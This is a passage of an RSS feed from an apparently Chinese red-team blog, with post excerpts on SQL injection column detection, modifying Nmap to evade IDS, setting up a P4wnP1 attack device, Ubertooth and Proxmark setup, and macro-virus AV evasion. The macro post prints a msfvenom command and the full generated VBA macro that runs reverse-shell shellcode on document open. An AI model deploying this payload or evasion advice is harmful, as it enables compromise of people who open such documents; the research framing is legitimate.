null列数探测成功，那么成功那个响应的网页相似度数值只可能是最大值或者最小值。对10个数值中去除最大值和最小值后，留下8个值，可以认为，这8个值都是列数猜测不成功返回的响应，对这个8个数据进行高斯分布建模，得出的模型就是列数猜测不成功的模型。现在使用最大值或者最小值来计算是否符合这个不成功的模型，如果符合，说明这个数据也是列数猜测不成功的响应，如果不符合，说明这个数据也是列数猜测成功的响应。&lt;/p&gt;</description>
    </item>
    <item>
      <title>红队基础设施建设与改造（一）——Nmap解析与改造</title>
      <link>https://yaphetszz.github.io/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E4%B8%80nmap%E8%A7%A3%E6%9E%90%E4%B8%8E%E6%94%B9%E9%80%A0/</link>
      <pubDate>Fri, 27 Nov 2020 01:30:09 +0800</pubDate>
      <guid>https://yaphetszz.github.io/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E4%B8%80nmap%E8%A7%A3%E6%9E%90%E4%B8%8E%E6%94%B9%E9%80%A0/</guid>
      <description>&lt;p&gt;&lt;strong&gt;本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;所谓工欲善其事必先利其器，渗透过程同样如此，虽然大部分人的目标并不是想当一个脚本小子，甚至身边有不少朋友“不屑”用别人的工具非要自己写。然后就是各种抱怨：&lt;/p&gt;&#xA;&lt;p&gt;“我X，扫描器又挂了！”“这个注入为什么我这个工具跑不出来”“怎么TM又超时了”“日，我IP又被ban了”这时候就开始真香了，自己写的全丢了，简历开头阿D明小子样样精通，实际项目里上来就是nmap，sqlmap一把梭，上了shell就是菜刀蚁剑直接连。&lt;/p&gt;&#xA;&lt;p&gt;但是实际渗透过程当中，在针对大型目标的测试中可能并不一定好使，目标系统部署着IPS，IDS直接就可以识别常规扫描器，攻击工具的连接。&lt;/p&gt;&#xA;&lt;p&gt;今天的第一篇基础设施的改造，就是我们非常常见的Nmap，nmap是一款优秀的端口扫描工具，同时内部集成了非常多的NSE脚本，在全球开源贡献者和安全人员的努力下集成的脚本越来越多，可以实现的特定设备扫描方式也越来越多，支持的漏洞种类也越来越全面，甚至有的漏洞可以实现端口扫描-&amp;gt;服务探测-&amp;gt;漏洞验证-&amp;gt;漏洞利用-&amp;gt;提权一条龙的操作，是一款非常优秀的工具。在官方wiki中的解释如下：&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Nmap (Network Mapper) is a free and open-source network scanner created by Gordon Lyon (also known by his pseudonym Fyodor Vaskovich).[3] Nmap is used to discover hosts and services on a computer network by sending packets and analyzing the responses. &#xD;&#xA;Nmap provides a number of features for probing computer networks, including host discovery and service and operating system detection. These features are extensible by scripts that provide more advanced service detection,[4] vulnerability detection,[4] and other features. Nmap can adapt to network conditions including latency and congestion during a scan. &#xD;&#xA;Nmap started as a Linux utility[5] and was ported to other systems including Windows, macOS, and BSD.[6] It is most popular on Linux, followed by Windows.[7] &#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;毕竟树大招风，现在越来越多的流量审计，IDS等设备都已经将Nmap的流量特征列入了重点监测对象。因此对流量的改造问题亟待解决，其中互联网上就有一份公开的流量特征检测规则样例，地址为：https://doc.emergingthreats.net/&lt;/p&gt;</description>
    </item>
    <item>
      <title>P4wnp1环境配置</title>
      <link>https://yaphetszz.github.io/posts/p4wnp1%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</link>
      <pubDate>Thu, 26 Nov 2020 07:20:13 +0800</pubDate>
      <guid>https://yaphetszz.github.io/posts/p4wnp1%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</guid>
      <description>&lt;p&gt;&lt;strong&gt;本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;准备工作：&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;烧录软件（此处推荐balenaEtcher）&lt;/li&gt;&#xA;&lt;li&gt;读卡器（能读TF卡就行）&lt;/li&gt;&#xA;&lt;li&gt;树莓派镜像（因为各种原因导致很多版本都存在bug，经过测试选用了稳定版本raspbian jessie，2017-07-05-raspbian-jessie-lite.img）下载渠道为官方&lt;/li&gt;&#xA;&lt;li&gt;树莓派zero w&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;准备完成之后首先烧录系统，忘记截图了，凑合着看就行。烧录系统完成后将两个文件放到boot盘中，以启用SSH和WiFi自动连接&#xA;1.完全空的ssh文件（无后缀无内容，只需文件名为ssh即可）&#xA;2.wpa_supplicant.conf&#xA;内容如下：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;network&lt;span style=&#34;color:#f92672&#34;&gt;={&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ssid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;WiFi_name&amp;#34;&lt;/span&gt;        //此处填写WiFi名称&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    psk&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;          //此处填写WiFi密码&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    key_mgmt&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;WPA-PSK        //此处填写加密方式&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    priority&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    scan_ssid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;完成后将系统卡插入树莓派，给树莓派上电。等待连接，WiFi尽量选择自己能控制的，比如手机热点，可以直接看到连接情况，便于直接获取树莓派IP地址。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/8d82f532-8f04-4c48-a344-f3f2b6bbc719.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;连接完成后通过ssh访问树莓派。默认登录信息为pi/raspberry&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/d90e43dc-d6cc-406d-b2d8-4ba3fe76550e.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;接下来要做的事是切换系统软件更新源&#xA;首先提升到管理员权限方便操作&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo su&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;../index_files/14459cab-127c-4c8f-979b-65714d21de52.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;接下来更新软件源&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apt-get update&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;../index_files/03c87010-d8da-4029-b126-bf919b223bc1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;安装相关命令&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apt-get install git john&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;完成后下载P4wnp1仓库，&#xA;可以直接去下载后通过SSH传入，也可以直接git clone命令,由于国内下载较慢，所以直接下载，在本机上开启python HTTP服务器&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python -m http.server &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;端口号&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;../index_files/758aee72-3144-405a-9721-b0a71a1bba5c.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;在树莓派内使用wget命令下载p4wnp1文件&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget http://ip:port/P4wnp1-master.zip&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;../index_files/a7647f43-4d0e-4037-a6e9-e57be74ce3ca.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;解压文件并进入对应目录，进入目录后执行安装脚本&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;unzip P4wnp1-master.zip&amp;lt;div&amp;gt;&amp;lt;br/&amp;gt;&amp;lt;/div&amp;gt;cd P4wnp1-master&amp;lt;div&amp;gt;&amp;lt;br/&amp;gt;&amp;lt;/div&amp;gt;./install.sh&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;../index_files/a883839a-86c1-47ce-950a-9e8536b64e4e.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;经过一番漫长的等待，中间会有几次卡住需要手动按回车，之后出现如下页面说明安装成功&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/744104ef-b9e3-49f0-bb42-7d69d5785988.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;记录下WiFi和SSH密码&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;WiFi name:    P4wnP1&#xD;&#xA;Key:          MaMe82-P4wnP1&#xD;&#xA;SSH access:    pi@172.24.0.1 (password: raspberry)&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;将树莓派重启后就可以使用P4wnp1了（需要插在被攻击电脑上）&lt;/p&gt;</description>
    </item>
    <item>
      <title>宏免杀分析</title>
      <link>https://yaphetszz.github.io/posts/%E5%AE%8F%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6/</link>
      <pubDate>Wed, 04 Nov 2020 10:24:11 +0800</pubDate>
      <guid>https://yaphetszz.github.io/posts/%E5%AE%8F%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6/</guid>
      <description>&lt;p&gt;&lt;strong&gt;本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;h1 id=&#34;宏病毒攻击方式的分析与研究&#34;&gt;宏病毒攻击方式的分析与研究&lt;/h1&gt;&#xA;&lt;p&gt;在目前的APT攻防对抗中，宏病毒作为钓鱼的主要技术支撑手段，在打点过程中起到了关键性的作用，不过随着宏病毒的泛滥，各大杀软厂商也相应地采取措施进行查杀，宏免杀技术也应运而生。从早期mht只需修改后缀就能执行的方式，到现在的各种混淆，远程加载等方式，对抗手段不断更新升级。本文就来简要分析一下目前主要的攻击方式实现原理。&lt;/p&gt;&#xA;&lt;h2 id=&#34;什么是宏病毒&#34;&gt;什么是宏病毒&lt;/h2&gt;&#xA;&lt;p&gt;宏病毒是一种寄存在文档或模板的宏中的计算机病毒。一旦打开这样的文档，其中的宏就会被执行，于是宏病毒就会被激活，转移到计算机上，并驻留在Normal模板上。从此以后，所有自动保存的文档都会“感染”上这种宏病毒，而且如果其他用户打开了感染病毒的文档，宏病毒又会转移到他的计算机上。&lt;/p&gt;&#xA;&lt;h2 id=&#34;宏病毒的危害&#34;&gt;宏病毒的危害&lt;/h2&gt;&#xA;&lt;p&gt;主要是感染文档，最早期的简单宏病毒目的只是让受害者无法打开文档，无法打印文档等，不过随着对抗手段的升级，目前的宏病毒主要以控制受害者电脑，获取到shell为目的，危害极大。&lt;/p&gt;&#xA;&lt;h2 id=&#34;宏病毒的生成&#34;&gt;宏病毒的生成&lt;/h2&gt;&#xA;&lt;h3 id=&#34;msf生成宏&#34;&gt;MSF生成宏&lt;/h3&gt;&#xA;&lt;p&gt;MSF作为主流渗透测试框架，功能多样，生成宏病毒自然不在话下。MSF通过msfvenom实现，示例命令如下：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msfvenom -p windows/meterpreter/reverse_tcp lhost&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;172.16.12.129 lport&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4444&lt;/span&gt; -f vba -o msf.vba&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;宏的内容如下：&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-vbscript&#34; data-lang=&#34;vbscript&#34;&gt;#If Vba7 Then&#xD;&#xA;&#x9;Private Declare PtrSafe Function CreateThread Lib &amp;#34;kernel32&amp;#34; (ByVal Ffqss As Long, ByVal Ggwnuq As Long, ByVal Iifiex As LongPtr, Gksky As Long, ByVal Hlnyst As Long, Kmko As Long) As LongPtr&#xD;&#xA;&#x9;Private Declare PtrSafe Function VirtualAlloc Lib &amp;#34;kernel32&amp;#34; (ByVal Vnbsa As Long, ByVal Xkoptrnhw As Long, ByVal Kghlzh As Long, ByVal Lppdd As Long) As LongPtr&#xD;&#xA;&#x9;Private Declare PtrSafe Function RtlMoveMemory Lib &amp;#34;kernel32&amp;#34; (ByVal Ztmgrm As LongPtr, ByRef Dnywi As Any, ByVal Zpxn As Long) As LongPtr&#xD;&#xA;#Else&#xD;&#xA;&#x9;Private Declare Function CreateThread Lib &amp;#34;kernel32&amp;#34; (ByVal Ffqss As Long, ByVal Ggwnuq As Long, ByVal Iifiex As Long, Gksky As Long, ByVal Hlnyst As Long, Kmko As Long) As Long&#xD;&#xA;&#x9;Private Declare Function VirtualAlloc Lib &amp;#34;kernel32&amp;#34; (ByVal Vnbsa As Long, ByVal Xkoptrnhw As Long, ByVal Kghlzh As Long, ByVal Lppdd As Long) As Long&#xD;&#xA;&#x9;Private Declare Function RtlMoveMemory Lib &amp;#34;kernel32&amp;#34; (ByVal Ztmgrm As Long, ByRef Dnywi As Any, ByVal Zpxn As Long) As Long&#xD;&#xA;#EndIf&#xD;&#xA;&#xD;&#xA;Sub Auto_Open()&#xD;&#xA;&#x9;Dim Ltw As Long, Eso As Variant, Ytpg As Long&#xD;&#xA;#If Vba7 Then&#xD;&#xA;&#x9;Dim  Tpgwi As LongPtr, Ivlfxyv As LongPtr&#xD;&#xA;#Else&#xD;&#xA;&#x9;Dim  Tpgwi As Long, Ivlfxyv As Long&#xD;&#xA;#EndIf&#xD;&#xA;&#x9;Eso = Array(232,130,0,0,0,96,137,229,49,192,100,139,80,48,139,82,12,139,82,20,139,114,40,15,183,74,38,49,255,172,60,97,124,2,44,32,193,207,13,1,199,226,242,82,87,139,82,16,139,74,60,139,76,17,120,227,72,1,209,81,139,89,32,1,211,139,73,24,227,58,73,139,52,139,1,214,49,255,172,193, _&#xD;&#xA;207,13,1,199,56,224,117,246,3,125,248,59,125,36,117,228,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,95,95,90,139,18,235,141,93,104,51,50,0,0,104,119,115,50,95,84,104,76,119,38,7,137,232,255,208,184,144,1,0, _&#xD;&#xA;0,41,196,84,80,104,41,128,107,0,255,213,106,10,104,172,16,12,129,104,2,0,17,92,137,230,80,80,80,80,64,80,64,80,104,234,15,223,224,255,213,151,106,16,86,87,104,153,165,116,97,255,213,133,192,116,10,255,78,8,117,236,232,103,0,0,0,106,0,106,4,86,87,104,2,217,200,95,255,213, _&#xD;&#xA;131,248,0,126,54,139,54,106,64,104,0,16,0,0,86,106,0,104,88,164,83,229,255,213,147,83,106,0,86,83,87,104,2,217,200,95,255,213,131,248,0,125,40,88,104,0,64,0,0,106,0,80,104,11,47,15,48,255,213,87,104,117,110,77,97,255,213,94,94,255,12,36,15,133,112,255,255,255,233,155, _&#xD;&#xA;255,255,255,1,195,41,198,117,193,195,187,240,181,162,86,106,0,83,255,213)&#xD;&#xA;&#xD;&#xA;&#x9;Tpgwi = VirtualAlloc(0, UBound(Eso), &amp;amp;H1000, &amp;amp;H40)&#xD;&#xA;&#x9;For Ytpg = LBound(Eso) To UBound(Eso)&#xD;&#xA;&#x9;&#x9;Ltw = Eso(Ytpg)&#xD;&#xA;&#x9;&#x9;Ivlfxyv = RtlMoveMemory(Tpgwi + Ytpg, Ltw, 1)&#xD;&#xA;&#x9;Next Ytpg&#xD;&#xA;&#x9;Ivlfxyv = CreateThread(0, 0, Tpgwi, 0, 0, 0)&#xD;&#xA;End Sub&#xD;&#xA;Sub AutoOpen()&#xD;&#xA;&#x9;Auto_Open&#xD;&#xA;End Sub&#xD;&#xA;Sub Workbook_Open()&#xD;&#xA;&#x9;Auto_Open&#xD;&#xA;End Sub&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用msf进行监听，之后在word中运行宏即可获得shell&lt;/p&gt;</description>
    </item>
    <item>
      <title>Ubuntu下ubertooth one环境配置</title>
      <link>https://yaphetszz.github.io/posts/ubuntu%E4%B8%8Bubertooth-one%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</link>
      <pubDate>Sun, 26 Apr 2020 10:14:00 +0800</pubDate>
      <guid>https://yaphetszz.github.io/posts/ubuntu%E4%B8%8Bubertooth-one%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</guid>
      <description>&lt;p&gt;&lt;strong&gt;本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;首先安装依赖&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apt-get install cmake libusb-1.0-0-dev make gcc g++ libbluetooth-dev &lt;span style=&#34;color:#ae81ff&#34;&gt;\&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;pkg-config libpcap-dev python-numpy python-pyside python-qt4&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;../index_files/806a0f8e-e185-4c19-aff0-ebb6bdb5dd54.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;为了避免权限出现问题我在安装前直接sudo su了，这样就不用每次操作都输sudo了&#xA;然后再桌面创建一个名为ubertooth的文件夹，并赋予777权限，以便之后不通过root用户也可以执行操作&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/08efc96a-5228-4394-9d4a-e49bfcfbcf69.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;然后通过github下载libbtbb，因为某些大家都知道的原因，我这边还通过了proxychains的代理&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget https://github.com/greatscottgadgets/libbtbb/archive/2018-12-R1.tar.gz -O libbtbb-2018-12-R1.tar.gz&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;../index_files/70c480e6-c0cb-4ce8-94d5-40a059441651.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;然后执行解压命令&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tar -xf libbtbb-2018-12-R1.tar.gz&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;../index_files/c9da4945-c0b1-4c37-b5a0-f183d55aac0d.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;进入目录，创建新的文件夹build（忽略我因为手残一开始打错了），然后开始编译&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/c399754c-9919-4f20-9a03-f24894194f05.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;cmake执行完后继续执行make&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/221ac6c7-b043-47dd-8dbd-bb38aa0337c5.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;然后执行make install&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/dd78c549-ae2d-4fc2-b1a2-902c6ef8eb92.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;看起来没有任何报错，根据官方文档如果第一次安装时报错还需执行sudo ldconfig&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/bcbd0aa3-57c1-4da0-9bf6-41bdc5f26dc9.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;执行完了以后就开始安装ubertooth tools了&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/4ee1fdab-e7f3-47bb-ae38-4b8d466acc95.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget https://github.com/greatscottgadgets/ubertooth/releases/download/2018-12-R1/ubertooth-2018-12-R1.tar.xz&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;../index_files/5f98b0b9-44e2-4e6b-a3f0-7528b66fbcec.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;解压&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/c8abc573-c9e8-43c7-a813-f576011f16e9.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;之后跟着上面截图操作即可，如果报错按之前的命令执行，反正我没报错&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/9a5953ad-4850-45db-bd87-28900ac39cde.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;接下来是安装wireshark&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/7c0fc116-39f9-40fe-b861-fd2db777362e.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;先安装依赖&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apt-get install wireshark wireshark-dev libwireshark-dev cmake&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后创建目录开始编译&#xA;没有error简直完美，记得之前在ubuntu16.04里配环境各种error心态都崩了&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/2db219c9-bff7-4df9-996e-f6448c354e01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;然后重复上面的一些操作&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/283a08cd-6353-45b2-b2c6-c621de46324b.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;按着步骤执行完了轻松加愉快&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/57799ac0-e8a1-4801-a55e-030470e9ebb1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;插上我们的ubertooth&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/adc7aed8-e291-4829-b77b-da1f1667302d.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;执行以下扫描康康，从我们的HCI里读到了一些东西，也就是和主机配对过的一些东西&lt;/p&gt;</description>
    </item>
    <item>
      <title>kali linux下PM3环境配置</title>
      <link>https://yaphetszz.github.io/posts/kali-linux%E4%B8%8Bpm3%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</link>
      <pubDate>Wed, 04 Sep 2019 19:21:57 +0800</pubDate>
      <guid>https://yaphetszz.github.io/posts/kali-linux%E4%B8%8Bpm3%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</guid>
